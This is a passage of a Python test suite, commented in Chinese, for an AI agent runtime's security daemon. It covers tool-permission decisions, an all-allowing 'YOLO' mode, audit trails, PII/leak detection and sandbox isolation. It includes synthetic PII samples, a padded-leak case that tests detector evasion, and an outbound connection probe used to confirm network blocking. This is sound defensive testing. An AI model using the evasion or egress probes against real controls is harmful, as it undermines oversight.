"""全部测试项定义。

每个函数返回 list[Step]；任一 Step.ok=False 则该测试项判失败。
断言尽量落在**可观测的外部事实**上（审计记录、HTTP 状态、判权返回值），
避免只验函数返回值而漏掉集成层断裂 —— 之前正是靠审计差分才发现
"hook 执行了但从未调用 securityd"。
"""
from __future__ import annotations

import json
import os
import sys
import time
import urllib.parse
import uuid
from pathlib import Path
from typing import Any

from engine import (Ctx, Step, test, AGENT_ID, TEST_AGENT_ID, PA_AGENT,
                    SECD_HOME, SECURITY_WEBUI_TOKEN)

import dbus  # noqa: E402  — engine.Ctx.dbus 已把 client 路径加进 sys.path

PA_ROOT = os.environ.get("PA_ROOT") or next(
    (path for path in (
        "/home/bianbu/build/bianbu-agent-runtime",
        "/home/bianbu/bianbu-agent-runtime",
        "/home/bianbu/bianbu-agent",
    ) if Path(path).is_dir()),
    "/home/bianbu/bianbu-agent",
)
SECURITY_PLUGIN_ROOT = os.environ.get(
    "BNSEC_SECURITY_PLUGIN_ROOT", str(Path(PA_ROOT) / "resources/plugins/bianbu.security")
)
_sbx_cache: dict[str, Any] = {}


def _load_sandbox_mods():
    """按文件路径直接加载沙箱模块，绕过 bianbu_agent 包的 __init__。

    不能 `import bianbu_agent.security_sandbox`：那会执行包的 __init__，
    拉进 pydantic/fastapi 等含 C 扩展的依赖。而本测试跑在系统 python3
    （3.14，有 dbus）上，PA venv 是 3.13 —— C 扩展跨版本不兼容
    （实测 ModuleNotFoundError: jsonschema）。

    这两个模块本身只用标准库，所以按路径独立加载是安全的。
    security_tool_runner 内部 `from bianbu_agent.security_sandbox import ...`，
    故先把已加载的 sandbox 模块塞进 sys.modules 供其解析。
    """
    if _sbx_cache:
        return _sbx_cache
    import importlib.util
    import types

    base = Path(PA_ROOT) / "bianbu_agent"
    security_base = base / "security"
    pkg = sys.modules.get("bianbu_agent")
    if pkg is None:
        pkg = types.ModuleType("bianbu_agent")
        pkg.__path__ = [str(base)]          # 空壳包，不执行真正的 __init__
        sys.modules["bianbu_agent"] = pkg
    security_pkg = sys.modules.get("bianbu_agent.security")
    if security_pkg is None:
        security_pkg = types.ModuleType("bianbu_agent.security")
        security_pkg.__path__ = [str(security_base)]
        sys.modules["bianbu_agent.security"] = security_pkg

    def _load(name: str):
        full = f"bianbu_agent.security.{name}"
        if full in sys.modules:
            return sys.modules[full]
        spec = importlib.util.spec_from_file_location(full, security_base / f"{name}.py")
        mod = importlib.util.module_from_spec(spec)
        sys.modules[full] = mod             # 先注册再执行，供后续模块 import
        spec.loader.exec_module(mod)
        return mod

    _sbx_cache["sandbox"] = _load("security_sandbox")
    _sbx_cache["runner"] = _load("security_tool_runner")
    return _sbx_cache


# ══════════════════════ 一、基础连通性 ══════════════════════
@test("CONN-01", "personal-agent HTTP 服务可达", "INT-PA-01", "connectivity")
def t_conn_pa(c: Ctx):
    st, _ = c.http("GET", "/api/v1/agents")
    return [Step("GET /api/v1/agents 返回 200", st == 200, f"实际 {st}")]


@test("CONN-02", "securityd 占用 io.bianbu.Security 总线名", "INT-PA-03", "connectivity")
def t_conn_secd(c: Ctx):
    steps = []
    try:
        iface = c.dbus()
        steps.append(Step("D-Bus 接口可获取", True))
        try:
            iface.CheckPermission("__unbound_probe__", "probe.cap", "")
            steps.append(Step("未绑定 Agent fail-closed", False,
                              "未绑定 caller 居然可调用 CheckPermission"))
        except dbus.DBusException as exc:
            denied = ("PermissionDenied" in str(exc) and
                      ("未绑定" in str(exc) or "caller" in str(exc)))
            steps.append(Step("未绑定 Agent fail-closed", denied,
                              f"实际 {type(exc).__name__}: {str(exc)[:160]}"))
        d = int(iface.CheckPermission(TEST_AGENT_ID, "probe.cap", ""))
        steps.append(Step("CheckPermission 可调用", d in (0, 1, 2), f"返回 {d}"))
    except Exception as e:
        steps.append(Step("D-Bus 接口可获取", False, f"{type(e).__name__}: {e}"))
    return steps


@test("CONN-03", "关键 D-Bus 方法全部导出（工具策略模型）", "INT-PA-03", "connectivity")
def t_conn_methods(c: Ctx):
    import re
    iface = c.dbus()
    intro = dbus.Interface(
        iface.proxy_object, "org.freedesktop.DBus.Introspectable").Introspect()
    methods = set(re.findall(r'<method name="([^"]+)"', intro))
    need = {"CheckPermission", "CheckPermissionV2", "RequestConfirm", "RespondConfirm",
            "RegisterCapabilities", "RevokePermission", "GetCapabilities", "GetAgentInfo",
            "SetCapabilityPolicy", "GetPermissionSettings", "SetPermissionGroup",
            "GetSecurityPermissions",
            "AuditLog", "ExportAudit", "VerifyAuditChain", "QueryAudit",
            "BuildSandboxPolicy", "SetNetworkPolicy", "GetNetworkPolicy",
            "VerifyManifest", "VerifyCodePackage", "VerifyCodeDigest",
            "InstallPackage", "ListAgents",
            "SuspendAgent", "GetAgentSecurityMode", "SetAgentSecurityMode"}
    missing = sorted(need - methods)
    c.log(f"导出 {len(methods)} 个方法，缺失 {missing}")
    # 已删除的 token 配额方法不得复活。
    stale = sorted(m for m in ("MeterTokens", "MeterTokensV2", "GetTokenBudget",
                               "SetTokenBudget") if m in methods)
    return [Step("关键方法齐全", not missing, f"缺失 {missing}", {"exported": sorted(methods)}),
            Step("token 配额方法已移除", not stale, f"仍导出 {stale}")]


# ══════════════════════ 二、工具策略判权 ══════════════════════
def _register_caps(c: Ctx):
    """注册测试用工具策略集（幂等）。三态：allow / ask / deny。"""
    def perm(tool, policy):
        return dbus.Dictionary({
            "tool": dbus.String(tool), "policy": dbus.String(policy),
        }, signature="sv")
    caps = dbus.Array([
        perm("read_file", "allow"),
        perm("search_files", "allow"),
        perm("write_file", "ask"),
        perm("terminal", "ask"),
        perm("process", "deny"),
    ], signature="a{sv}")
    return bool(c.dbus().RegisterCapabilities(TEST_AGENT_ID, caps))


@test("PERM-01", "工具策略注册成功", "INT-PA-02", "permission")
def t_perm_register(c: Ctx):
    ok = _register_caps(c)
    info = json.loads(str(c.dbus().GetAgentInfo(TEST_AGENT_ID)["json"]))
    rows = {p.get("tool"): p.get("policy") for p in info.get("capabilities", [])}
    want = {"read_file": "allow", "search_files": "allow",
            "write_file": "ask", "terminal": "ask", "process": "deny"}
    return [
        Step("RegisterCapabilities 返回 True", ok),
        Step("五个工具策略均已登记并保持三态", all(rows.get(k) == v for k, v in want.items()),
             f"实际 {rows}"),
    ]


@test("PERM-02", "判权三态：ALLOW / ASK / DENY", "INT-PA-02", "permission")
def t_perm_tristate(c: Ctx):
    _register_caps(c)
    caps = c.dbus().GetCapabilities(TEST_AGENT_ID) or []
    c.log(f"已注册：{[(str(r.get('tool')), str(r.get('policy'))) for r in caps]}")
    steps = [
        Step("声明 allow 的只读工具 → ALLOW", c.check_permission("read_file") == "ALLOW"),
        Step("声明 allow 的只读工具 → ALLOW（第二个）",
             c.check_permission("search_files") == "ALLOW"),
        Step("声明 ask 的写入工具 → CONFIRM", c.check_permission("write_file") == "CONFIRM"),
        Step("声明 ask 的命令工具 → CONFIRM", c.check_permission("terminal") == "CONFIRM"),
        Step("声明 deny 的工具 → DENY", c.check_permission("process") == "DENY"),
        Step("未声明工具 → CONFIRM（未映射默认交用户确认）",
             c.check_permission("never.registered.tool") == "CONFIRM"),
    ]
    return steps


@test("PERM-03", "非法策略值被拒绝（只接受 allow/ask/deny）", "INT-PA-02", "permission")
def t_perm_invalid_policy(c: Ctx):
    bad = dbus.Array([dbus.Dictionary({
        "tool": dbus.String("evil.tool"), "policy": dbus.String("trusted"),
    }, signature="sv")], signature="a{sv}")
    rejected = False
    try:
        c.dbus().RegisterCapabilities(TEST_AGENT_ID, bad)
    except Exception as e:
        rejected = True
        c.log(f"按预期被拒: {str(e)[:150]}")
    return [Step("非三态策略被拒绝", rejected,
                 "竟然注册成功了 —— 未知策略会绕过 allow/ask/deny 语义")]


@test("PERM-04", "撤销工具策略后判权转为 DENY", "INT-PA-02", "permission")
def t_perm_revoke(c: Ctx):
    _register_caps(c)
    before = c.check_permission("read_file")
    c.dbus().RevokePermission(TEST_AGENT_ID, "read_file")
    after = c.check_permission("read_file")
    # 复原，避免影响后续测试
    c.dbus().SetCapabilityPolicy(TEST_AGENT_ID, "read_file", "allow")
    restored = c.check_permission("read_file")
    return [
        Step("撤销前为 ALLOW", before == "ALLOW", f"实际 {before}"),
        Step("撤销后为 DENY", after == "DENY", f"实际 {after}"),
        Step("复原后回到 ALLOW", restored == "ALLOW", f"实际 {restored}"),
    ]


@test("YOLO-01", "管理员 YOLO 模式全能力放行且审计、恢复完整", "INT-PA-02", "permission")
def t_yolo_mode(c: Ctx):
    """验证真实 D-Bus 管理面、判权面和审计链，而不是直接调用本地引擎。

    专用临时 Agent 避免冒充 PA；无论中间断言是否成功，finally 都先恢复 normal，
    验证原 DENY 策略恢复后再注销，防止一次失败污染后续测试。
    """
    iface = c.dbus()
    aid = f"{TEST_AGENT_ID}.yolo.{uuid.uuid4().hex[:8]}"
    registered = False
    restored = None
    delta: list[dict] = []
    before_mode = ""
    initial: dict[str, str] = {}
    normal_denied = -1
    normal_undeclared = -1
    yolo_denied = -1
    yolo_unknown = -1
    changed: dict[str, str] = {}

    def perm(tool: str, policy: str):
        return dbus.Dictionary({
            "tool": dbus.String(tool),
            "policy": dbus.String(policy),
        }, signature="sv")

    try:
        iface.RegisterAgent(aid, dbus.Dictionary({
            "name": dbus.String("YOLO test Agent"),
            "version": dbus.String("1.0.0"),
        }, signature="sv"))
        registered = True
        iface.SyncAgentCapabilities(
            aid, dbus.Array([perm("read_file", "deny")], signature="a{sv}"))
        initial = {str(k): str(v) for k, v in iface.GetAgentSecurityMode(aid).items()}
        # securityd 0.1.27+（commit 3f3deb1，2026-09-09）：新注册 Agent 默认 yolo，
        # updated_by=initial-agent-default；管理员显式选择后保留。先切 normal 建立基线。
        iface.SetAgentSecurityMode(aid, "normal")
        before_mode = str(iface.GetAgentSecurityMode(aid)["mode"])
        normal_denied = int(iface.CheckPermission(aid, "read_file", "/tmp/denied"))
        normal_undeclared = int(iface.CheckPermission(aid, "never.declared.tool", ""))
        seq0 = c.audit_seq()
        changed = {str(k): str(v) for k, v in
                   iface.SetAgentSecurityMode(aid, "yolo").items()}
        yolo_denied = int(iface.CheckPermission(aid, "read_file", "/tmp/denied"))
        yolo_unknown = int(iface.CheckPermission(
            aid, "future.capability.not.registered", "/future/scope"))
        time.sleep(1)
        delta = c.audit_since(seq0)
    finally:
        if registered:
            try:
                iface.SetAgentSecurityMode(aid, "normal")
                restored = int(iface.CheckPermission(aid, "read_file", "/tmp/denied"))
            finally:
                iface.UnregisterAgent(aid)

    transitions = [row for row in delta
                   if row.get("agent_id") == aid
                   and row.get("op_type") == "security_mode_change"]
    yolo_checks = [row for row in delta
                   if row.get("agent_id") == aid
                   and row.get("op_type") == "check_permission"]
    transition_target = str(transitions[0].get("target", "")) if transitions else ""
    c.log(f"Agent={aid} normal={normal_denied} yolo=({yolo_denied},{yolo_unknown}) "
          f"restored={restored} audit={len(delta)}")
    return [
        Step("新注册 Agent 初始模式为产品默认 yolo（initial-agent-default）",
             initial.get("mode") == "yolo"
             and initial.get("updated_by") == "initial-agent-default",
             f"实际 {initial} —— 与 securityd 3f3deb1 声明的默认值不一致"),
        Step("管理员可切到 normal", before_mode == "normal", f"实际 {before_mode}"),
        Step("normal 保留原 DENY", normal_denied == 2, f"实际 {normal_denied}"),
        Step("normal 未声明工具为 ASK（未映射默认交用户确认）",
             normal_undeclared == 1, f"实际 {normal_undeclared}"),
        Step("管理面返回 normal→yolo", changed.get("old_mode") == "normal"
             and changed.get("mode") == "yolo", f"实际 {changed}"),
        Step("YOLO 放行已撤销能力", yolo_denied == 0, f"实际 {yolo_denied}"),
        Step("YOLO 放行未来未知能力", yolo_unknown == 0, f"实际 {yolo_unknown}"),
        Step("每次 YOLO 判权明确审计 mode=yolo", len(yolo_checks) == 2 and all(
            row.get("result") == "decision=ALLOW;mode=yolo" for row in yolo_checks),
            f"实际 {[(r.get('target'), r.get('result')) for r in yolo_checks]}"),
        Step("模式转换审计含 Agent/old/new/actor/timestamp", bool(transitions)
             and f"agent={aid}" in transition_target
             and "old_mode=normal" in transition_target
             and "new_mode=yolo" in transition_target
             and "actor=uid=" in transition_target
             and "timestamp=" in transition_target,
             f"实际 {transition_target}"),
        Step("关闭 YOLO 恢复粒度 DENY", restored == 2, f"实际 {restored}"),
    ]


# ══════════════════════ 三、hook 派发（端到端） ══════════════════════
@test("HOOK-01", "8 个 security hook 全部加载且启用", "INT-PA-01", "hook")
def t_hook_loaded(c: Ctx):
    st, r = c.http("GET", "/api/v1/capabilities/hook")
    ids = {h.get("capability_id") or h.get("id") for h in (r or {}).get("data", [])}
    want = {f"bianbu.security/security.{n}" for n in
            ("before_run", "after_context", "before_model", "after_model",
             "before_tool", "after_tool", "after_run", "on_error")}
    missing = sorted(want - ids)
    enabled = {h.get("capability_id"): h.get("enabled")
               for h in (r or {}).get("data", []) if "security." in str(h.get("capability_id"))}
    return [
        Step("HTTP 200", st == 200, f"实际 {st}"),
        Step("8 个 hook 均已注册", not missing, f"缺失 {missing}"),
        Step("全部 enabled=True", all(enabled.values()), f"实际 {enabled}"),
    ]


@test("HOOK-02", "纯对话 run 可完成（hook 不阻断正常流程）", "INT-PA-01", "hook")
def t_hook_plain_run(c: Ctx):
    d = c.run_prompt("请只回复两个汉字：收到")
    return [
        Step("run 状态为 completed", d.get("status") == "completed",
             f"实际 {d.get('status')} error={str(d.get('error'))[:200]}"),
        Step("有返回内容", bool(d.get("content")), f"content={str(d.get('content'))[:120]}"),
    ]


@test("HOOK-03", "工具调用触发 before_tool→securityd（审计留痕）", "INT-PA-02", "hook")
def t_hook_tool_audit(c: Ctx):
    """决定性测试：工具调用必须在 securityd 审计里留下 check_permission 记录。

    这项若失败，说明 hook 执行了但从未真正调用 securityd —— 判权形同虚设。
    """
    marker = f"BNSEC-HOOK-{time.time_ns()}"
    seq0 = c.audit_seq()
    with c.enforcing_mode(AGENT_ID):
        d = c.run_prompt(
            "请只直接调用名为 read_file 的工具一次读取 /etc/hostname，"
            f"然后原样回复读取结果和测试代号 {marker}。"
            "不要调用 execute_code、terminal 或其他工具。", approve_tools=("read_file",))
        time.sleep(2)
    delta = c.audit_since(seq0)
    checks = [r for r in delta if r["op_type"] == "check_permission"
              and r.get("agent_id") == AGENT_ID]
    file_checks = [r for r in checks
                   if str(r.get("target", "")).startswith("file.read:")]
    executed = [r for r in delta if r.get("agent_id") == AGENT_ID
                and r.get("op_type") == "read_file"]
    c.log(f"审计增量 {len(delta)} 条，check_permission {len(checks)} 条"
          f"（其中 file.read 相关 {len(file_checks)} 条）")
    for r in checks[:8]:
        c.log(f"  seq={r['seq']} {r['op_type']} {r['target']} → {r['result']}")
    return [
        Step("run 完成", d.get("status") == "completed",
             f"实际 {d.get('status')} error={str(d.get('error'))[:160]}"),
        Step("securityd 收到 check_permission", len(checks) > 0,
             f"审计增量共 {len(delta)} 条，无 check_permission —— "
             f"工具调用未经判权（映射返回 None 落到 DEFAULT_ALLOW）",
             {"delta": delta[:20]}),
        Step("判权针对 file.read 能力", len(file_checks) > 0,
             f"有判权但 target 不含 file.read：{[r.get('target') for r in checks[:5]]}"),
        Step("normal 模式下判权结果为明确 allow（非 yolo 旁路）",
             any(r.get("result") == "allow" for r in file_checks),
             f"实际 {[r.get('result') for r in file_checks]}"),
        Step("判权早于工具执行（审计 seq 顺序）",
             bool(file_checks) and (not executed or file_checks[0]["seq"] < executed[0]["seq"]),
             f"check seq={[r['seq'] for r in file_checks[:2]]} exec seq={[r['seq'] for r in executed[:2]]}"),
    ]


@test("HOOK-04", "工具名即策略键：MCP 按 server、本地工具按名判权", "INT-PA-04", "hook")
def t_hook_unmapped(c: Ctx):
    """工具名就是策略键，映射不再有"工具 → 能力名"的第二套命名。

    MCP server 来自外部，其能力边界不受本地代码约束：一台 server 一条
    `mcp.<server>` 策略即可管住其下全部工具，不能被工具名字面绕过。
    """
    plug = SECURITY_PLUGIN_ROOT
    if plug not in sys.path:
        sys.path.append(plug)
    # 强制重载，避免拿到上一轮缓存的旧实现
    for m in [k for k in list(sys.modules) if k == "lib" or k.startswith("lib.")]:
        del sys.modules[m]
    from lib.mapping import resolve_capability, unmapped_policy
    plugin_meta = {"origin": "plugin", "plugin_id": "bianbu.memory"}
    mcp_meta = {"origin": "mcp", "mcp_id": "some.server"}
    r_mem = resolve_capability(
        "bianbu.memory/memory", {}, tool_metadata=plugin_meta)
    r_term = resolve_capability("terminal", {})
    r_unknown = resolve_capability(
        "some.server/frobnicate", {}, tool_metadata=mcp_meta)
    r_legacy = resolve_capability("bianbu.memory/memory_retrieve", {})
    c.log(f"unmapped_policy={unmapped_policy()}（未识别工具默认交用户确认）")
    c.log(f"resolve('bianbu.memory/memory')   = {r_mem}")
    c.log(f"resolve('terminal')               = {r_term}")
    c.log(f"resolve('some.server/frobnicate') = {r_unknown}")
    c.log(f"resolve legacy qualified memory   = {r_legacy}")
    return [
        Step("本地工具名即策略键（terminal）", r_term == ("terminal", ""),
             f"terminal → {r_term}"),
        Step("限定名插件工具归到 local_name",
             r_mem == ("memory", ""),
             f"实际 {r_mem} —— 策略键应与配置台展示的工具名一致"),
        Step("MCP 工具按 server 判权",
             r_unknown is not None and r_unknown[0] == "mcp.some.server",
             f"实际 {r_unknown} —— 工具名不得绕过 server 能力边界"),
        Step("旧调用方缺元数据时限定名从严按 MCP",
             r_legacy == ("mcp.bianbu.memory", "memory_retrieve"),
             f"实际 {r_legacy} —— 不得因 local_name 命中内置表而脱离 server 边界"),
        Step("空工具名返回 None（交调用方按 unmapped_policy 处置）",
             resolve_capability("", {}) is None
             and resolve_capability("zzz_unknown_xyz", {}) == ("zzz_unknown_xyz", ""),
             "恒等映射：工具名即策略键，未知工具走 unmapped_policy"),
    ]


# ══════════════════════ 四、DLP / PII ══════════════════════
def _pii_types(scanner, text: str) -> set[str]:
    """扫描并返回 PII 类型名集合。

    scan() 返回 ScanResult（非可迭代），类型集合在 .types 属性里，
    元素是 PIIType 枚举 —— 取 .value 才能和字符串比较。
    """
    res = scanner.scan(text)
    return {getattr(t, "value", str(t)) for t in res.types}


@test("DLP-01", "PII 扫描器覆盖 8 类实体", "INT-PA-11", "dlp")
def t_dlp_types(c: Ctx):
    import sys
    if SECD_HOME not in sys.path:
        sys.path.append(SECD_HOME)
    from securityd.dlp.pii_scanner import PIIScanner
    sc = PIIScanner()
    cases = {
        "name": "患者陈芳于今日入院",
        "email": "联系 zhang.san@example.com",
        "phone": "手机 13812345678",
        # 校验位必须算对：GB 11643 加权校验 / Luhn。用凑的号码会被产品正确
        # 拒绝（初版用 ...123X 与 ...890123 均检不出，是测试数据的问题）
        "id_card": "身份证 110105199003070121",
        "bank_card": "卡号 6222020000000000000",
        "address": "住址：北京市海淀区中关村大街1号",
        "medical": "诊断为2型糖尿病，需长期服药",
        "biometric": "已采集指纹特征数据用于身份核验",
    }
    steps = []
    for kind, text in cases.items():
        found = _pii_types(sc, text)
        steps.append(Step(f"检出 {kind}", kind in found, f"实际检出 {sorted(found)}"))
        c.log(f"{kind}: {sorted(found)}")
    return steps


@test("DLP-02", "身份证/银行卡校验和防误报", "INT-PA-11", "dlp")
def t_dlp_checksum(c: Ctx):
    import sys
    if SECD_HOME not in sys.path:
        sys.path.append(SECD_HOME)
    from securityd.dlp.pii_scanner import PIIScanner
    sc = PIIScanner()
    h1 = _pii_types(sc, "订单号 11010519900307999")    # 长度/校验位不合法
    h2 = _pii_types(sc, "流水号 1234567890123456")     # 不满足 Luhn+BIN
    c.log(f"伪身份证 → {sorted(h1)}；伪卡号 → {sorted(h2)}")
    return [
        Step("非法身份证不误判", "id_card" not in h1, f"误判为 {sorted(h1)}"),
        Step("非法卡号不误判", "bank_card" not in h2, f"误判为 {sorted(h2)}"),
    ]


@test("DLP-03", "逐字泄露检测（双信号）", "INT-PA-11", "dlp")
def t_dlp_verbatim(c: Ctx):
    import sys
    if SECD_HOME not in sys.path:
        sys.path.append(SECD_HOME)
    from securityd.dlp.handlers import detect_verbatim_leak
    corpus = ["这是一段需要保护的参考语料，" * 12]
    leaked = corpus[0][:260]
    evaded = leaked + "另外补充十五个字符以规避覆盖率阈值"
    normal = "这是一段完全独立撰写的总结，不包含任何原文片段。"
    a = detect_verbatim_leak(leaked, corpus)
    b = detect_verbatim_leak(evaded, corpus)
    d = detect_verbatim_leak(normal, corpus)
    c.log(f"整段复制 → {a}；追加规避 → {b}；正常输出 → {d}")
    return [
        Step("整段复制被检出", bool(a)),
        Step("追加字符规避仍被检出（绝对长度主信号）", bool(b),
             "覆盖率被稀释后漏检 —— 单信号可被绕过"),
        Step("正常输出不误报", not d, f"误报 {d}"),
    ]


@test("DLP-04", "PA 大载荷走正式 UDS 与中央策略", "ARCH-01/INT-PA-11", "dlp")
def t_dlp_production_uds(c: Ctx):
    """真实 PA 进程必须用自身 SO_PEERCRED 调 dlp.scan/audit.batch。

    仅测 UDS client 本身不足以证明 PA hook 已选路；这里临时把中央手机号策略设为
    BLOCK，发送 >4KB 的真实 run，再用审计差分证明中央策略、扫描和完整载荷均到达
    securityd。测试结束恢复原显式策略，避免污染环境。
    """
    pii_type = "phone"
    production_policy = bool(SECURITY_WEBUI_TOKEN)
    store = None
    if production_policy:
        code, payload = c.security_webui(
            "GET", f"/api/dlp/policies?agent={urllib.parse.quote(AGENT_ID)}")
        if code != 200:
            raise RuntimeError(f"读取生产 DLP 策略失败 HTTP {code}: {payload}")
        explicit = next((row for row in payload.get("policies", [])
                         if row["pii_type"] == pii_type), None)
    else:
        if SECD_HOME not in sys.path:
            sys.path.append(SECD_HOME)
        from securityd.dlp.policy_store import DLPAction, DLPPolicyStore
        store = DLPPolicyStore()
        explicit = next((row for row in store.list_policies(AGENT_ID)
                         if row["pii_type"] == pii_type), None)
    seq0 = c.audit_seq()
    try:
        if production_policy:
            code, payload = c.security_webui("POST", "/api/dlp/policy", {
                "agent_id": AGENT_ID, "pii_type": pii_type, "action": "block"})
            if code != 200:
                raise RuntimeError(f"设置生产 DLP 策略失败 HTTP {code}: {payload}")
        else:
            store.set_policy(AGENT_ID, pii_type, DLPAction.BLOCK)
        # PA 中央策略缓存默认 5 秒；等待旧缓存失效后再发真实 run。
        time.sleep(6)
        prompt = ("只判断下列文本是否含手机号：" + "普通文本" * 1100
                  + " 联系电话 13812345678")
        # yolo 模式下 hook 对 BLOCK 只审计不拦截，必须在 normal 下验证阻断。
        with c.enforcing_mode(AGENT_ID):
            run = c.run_prompt(prompt, timeout=90)
    finally:
        if production_policy:
            if explicit is None:
                c.security_webui("DELETE", "/api/dlp/policy", {
                    "agent_id": AGENT_ID, "pii_type": pii_type})
            else:
                c.security_webui("POST", "/api/dlp/policy", {
                    "agent_id": AGENT_ID, "pii_type": pii_type,
                    "action": explicit["action"]})
        else:
            if explicit is None:
                store.delete_policy(AGENT_ID, pii_type)
            else:
                store.set_policy(AGENT_ID, pii_type, explicit["action"])
            store.close()

    delta = c.audit_since(seq0)
    scans = [row for row in delta if row.get("op_type") == "uds_dlp_scan"
             and row.get("agent_id") == AGENT_ID]
    full = [row for row in delta if row.get("op_type") == "uds_audit_batch"
            and "hook_payload:input" in str(row.get("result") or "")]
    c.log(f"run={run.get('status')} UDS扫描={len(scans)} 完整审计={len(full)}")
    return [
        Step("中央 BLOCK 策略阻断真实 run", run.get("status") == "failed",
             f"实际 status={run.get('status')} —— PA 可能仍在读本地策略库"),
        Step("PA 大载荷经 dlp.scan", bool(scans),
             "无 uds_dlp_scan 审计 —— PA hook 未选择正式 UDS 数据面"),
        Step("扫描载荷确实超过 4KB",
             any(int(str(row.get("target") or "").split("=", 1)[-1]) > 4096
                 for row in scans),
             f"targets={[row.get('target') for row in scans]}"),
        Step(">1KB 完整载荷经 audit.batch", bool(full),
             "无 hook_payload:input —— 仅写了 D-Bus 元数据审计"),
        Step("audit.batch 保存完整而非摘要",
             any(len(str(row.get("result") or "").encode("utf-8")) > 1024
                 for row in full),
             f"result_bytes={[len(str(row.get('result') or '').encode('utf-8')) for row in full]}"),
    ]


# ══════════════════════ 五、安全权限设置（结构化五组） ══════════════════════
@test("SET-01", "安全权限设置可读写（可读/可写/网络/系统调用/自定义）", "INT-PA-12", "permission")
def t_permission_settings(c: Ctx):
    """权限设置不再散落在域×风险里，而是五组结构化条目。

    「自定义」是运维手写的自由 JSON：重设策略或套用预设时**不能被冲掉** ——
    它是量体裁衣的兜底，丢了就等于把用户的手工配置清零。
    """
    iface = c.dbus()
    aid = TEST_AGENT_ID
    try:
        iface.RegisterAgent(aid, dbus.Dictionary({
            "name": dbus.String("permission-settings testkit"),
            "version": dbus.String("1.0.0"),
        }, signature="sv"))
    except Exception as e:  # noqa: BLE001 — 已注册同样可继续
        c.log(f"RegisterAgent（幂等）：{str(e)[:120]}")

    import json as _json
    before = _json.loads(str(iface.GetSecurityPermissions(aid)["json"]))
    c.log(f"初始权限设置：{_json.dumps(before, ensure_ascii=False)[:300]}")
    want_groups = {"read", "write", "network", "syscall", "custom"}
    steps = [Step("五组设置齐全", want_groups <= set(before), f"实际 keys={list(before)}")]

    steps.append(Step("可读组存在", "read" in before, f"keys={list(before)}"))
    steps.append(Step("网络组带 mode/domains",
                      isinstance(before.get("network"), dict)
                      and "mode" in before["network"],
                      f"实际 {before.get('network')}"))
    steps.append(Step("系统调用组带 arch/effective",
                      isinstance(before.get("syscall"), dict)
                      and "arch" in before["syscall"],
                      f"实际 {before.get('syscall')}"))

    # 写入自定义组并确认它单独可见、且不被其它组覆盖
    marker = {"note": "testkit-custom", "allow": ["/srv/data"]}
    iface.SetPermissionGroup(aid, "custom", _json.dumps(marker, ensure_ascii=False))
    after = _json.loads(str(iface.GetSecurityPermissions(aid)["json"]))
    c.log(f"写 custom 后：{_json.dumps(after, ensure_ascii=False)[:300]}")
    steps.append(Step("自定义组写入生效", after.get("custom") == marker,
                      f"实际 {after.get('custom')}"))

    # 写可读组不得冲掉自定义组
    iface.SetPermissionGroup(aid, "read", _json.dumps(["/tmp"], ensure_ascii=False))
    after2 = _json.loads(str(iface.GetSecurityPermissions(aid)["json"]))
    steps.append(Step("重设可读组不冲掉自定义组", after2.get("custom") == marker,
                      f"实际 {after2.get('custom')} —— 用户手工配置被清掉了"))
    steps.append(Step("可读组已更新", after2.get("read") == ["/tmp"],
                      f"实际 {after2.get('read')}"))

    # 未知组必须被拒绝（否则拼错的组名静默丢失策略）
    rejected = False
    try:
        iface.SetPermissionGroup(aid, "nonsense", _json.dumps([]))
    except Exception as e:  # noqa: BLE001
        rejected = True
        c.log(f"未知组按预期被拒：{str(e)[:120]}")
    steps.append(Step("未知权限组被拒绝", rejected, "竟然接受了 —— 拼错的组名会静默丢策略"))

    # 复原
    try:
        iface.SetPermissionGroup(aid, "custom", _json.dumps({}, ensure_ascii=False))
        iface.SetPermissionGroup(aid, "read", _json.dumps([], ensure_ascii=False))
    except Exception as e:  # noqa: BLE001
        c.log(f"复原失败（需人工检查）：{str(e)[:120]}")
    return steps


@test("SBX-01", "bwrap 可用且基础隔离生效", "INT-PA-15", "sandbox")
def t_sbx_avail(c: Ctx):
    m = _load_sandbox_mods()["sandbox"]
    sandbox_available, SandboxConfig, build_bwrap_argv = (
        m.sandbox_available, m.SandboxConfig, m.build_bwrap_argv)
    ok, detail = sandbox_available()
    c.log(f"sandbox_available → {ok}, {detail}")
    steps = [Step("bwrap 可用", bool(ok), str(detail))]
    if ok:
        cfg = SandboxConfig(mode="tool", net=False, rw_dirs=("/tmp",))
        exe, argv = build_bwrap_argv("/bin/true", [], cfg, with_limits=False)
        joined = " ".join(argv)
        for flag in ("--unshare-user", "--unshare-pid", "--cap-drop", "--die-with-parent"):
            steps.append(Step(f"argv 含 {flag}", flag in joined))
        steps.append(Step("net=false 时含 --unshare-net", "--unshare-net" in joined))
    return steps


@test("SBX-02", "沙箱内可执行且 PID 命名空间隔离", "INT-PA-17", "sandbox")
def t_sbx_exec(c: Ctx):
    m = _load_sandbox_mods()["sandbox"]
    SandboxConfig, build_bwrap_argv = m.SandboxConfig, m.build_bwrap_argv
    cfg = SandboxConfig(mode="tool", net=False, rw_dirs=("/tmp",))
    exe, argv = build_bwrap_argv(
        "/usr/bin/python3", ["-c", "import os;print('pid',os.getpid())"],
        cfg, with_limits=False)
    # 用 subprocess 列表形式执行，不要拼 shell 字符串 —— 拼接会让内层引号被
    # shell 吃掉（实测 print('pid',...) 变成 print(pid,...) → NameError）
    import subprocess
    p = subprocess.run([exe] + argv, capture_output=True, text=True, timeout=90)
    rc, out = p.returncode, (p.stdout + p.stderr)
    c.log(f"rc={rc} 输出: {out.strip()[:200]}")
    return [
        Step("沙箱内进程成功执行", rc == 0, f"rc={rc} out={out[:200]}"),
        Step("PID 被重编号（隔离生效）", "pid 1" in out or "pid 2" in out,
             f"实际输出 {out.strip()[:120]}"),
    ]


@test("SBX-03", "net=false 阻断出网", "INT-PA-16", "sandbox")
def t_sbx_net(c: Ctx):
    m = _load_sandbox_mods()["sandbox"]
    SandboxConfig, build_bwrap_argv = m.SandboxConfig, m.build_bwrap_argv
    probe = ("import socket;s=socket.socket();s.settimeout(6)\n"
             "try:\n s.connect(('10.0.50.55',80));print('CONNECTED')\n"
             "except Exception as e:print('BLOCKED',type(e).__name__)")
    res = {}
    for net in (False, True):
        cfg = SandboxConfig(mode="tool", net=net, rw_dirs=("/tmp",))
        exe, argv = build_bwrap_argv("/usr/bin/python3", ["-c", probe], cfg, with_limits=False)
        import subprocess
        p = subprocess.run([exe] + argv, capture_output=True, text=True, timeout=60)
        res[net] = (p.stdout + p.stderr).strip()
        c.log(f"net={net} → {res[net][:100]}")
    return [
        Step("net=false 出网被阻断", "BLOCKED" in res[False], f"实际 {res[False][:120]}"),
